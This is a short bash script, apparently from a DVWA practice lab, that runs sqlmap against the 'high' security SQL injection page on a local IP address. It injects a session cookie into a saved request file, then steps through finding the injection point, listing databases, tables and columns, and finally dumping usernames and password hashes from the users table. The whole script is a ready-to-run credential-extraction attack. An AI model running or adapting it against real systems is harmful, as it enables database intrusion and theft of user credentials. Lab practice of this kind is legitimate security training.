#!/bin/bash

TARGET_URL="http://192.168.0.103:8080/vulnerabilities/sqli/"
PHPSESSID="orlatscvk7pkupj0bqjhknvp41"
REQUEST_FILE="/home/gaoyin/Desktop/sqli_high.txt"

sed -i "s/Cookie:.*/Cookie: PHPSESSID=$PHPSESSID; security=high/" "$REQUEST_FILE"

echo "[*] 检测注入点"
sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch

echo "[*] 枚举所有数据库"
sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch --dbs

echo "[*] 枚举 dvwa 库的表"
sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch -D dvwa --tables

echo "[*] 枚举 users 表的列"
sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch -D dvwa -T users --columns

echo "[*] 导出 user,password"
sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch -D dvwa -T users -C user,password --dump

echo "[+] 完成"
